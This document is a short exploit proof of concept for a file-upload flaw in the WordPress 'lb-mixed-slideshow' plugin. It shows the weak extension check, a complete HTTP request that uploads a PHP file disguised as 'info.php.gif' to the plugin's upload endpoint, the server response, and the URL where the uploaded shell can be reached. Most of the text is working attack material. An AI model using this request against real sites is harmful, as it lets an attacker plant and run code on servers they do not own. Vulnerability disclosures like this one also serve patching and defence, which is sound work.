Exploit:

php poc.php


 upload file but extension limited, but other server config still run file if which match .php*

if (($ext != "jpg") && ($ext != "jpeg") && ($ext != "png") && ($ext != "gif")) {
		$json['error'][] = $file . " is not support image file";

Burpsuite Request:

POST /wordpress/wp-content/plugins/lb-mixed-slideshow/libs/uploadify/upload.php?element_name=images&gid=1 HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-Length: 224
Content-Type: multipart/form-data; boundary=------------------------452aab5b3cad62c9
Connection: close

--------------------------452aab5b3cad62c9
Content-Disposition: form-data; name="images"; filename="info.php.gif"
Content-Type: application/octet-stream

<?php phpinfo();?>
--------------------------452aab5b3cad62c9--






=> RESPONSE

HTTP/1.1 200 OK
Date: Fri, 24 Aug 2018 03:20:47 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.5.35
X-Powered-By: PHP/5.5.35
Content-Length: 400
Connection: close
Content-Type: text/html

<br />
<b>Warning</b>:  basename() expects parameter 1 to be string, object given in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\lb-mixed-slideshow\libs\uploadify\upload.php</b> on line <b>51</b><br />
<br />
<b>Fatal error</b>:  Call to undefined function update_image() in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\lb-mixed-slideshow\libs\uploadify\upload.php</b> on line <b>60</b><br />


If upload done -> response null JSON and response code status 200, If upload error -> response name file or response code status 500

access shell at url:


http://127.0.0.1/wordpress/wp-content/plugins/lb-mixed-slideshow/gallery/1/info.php.gif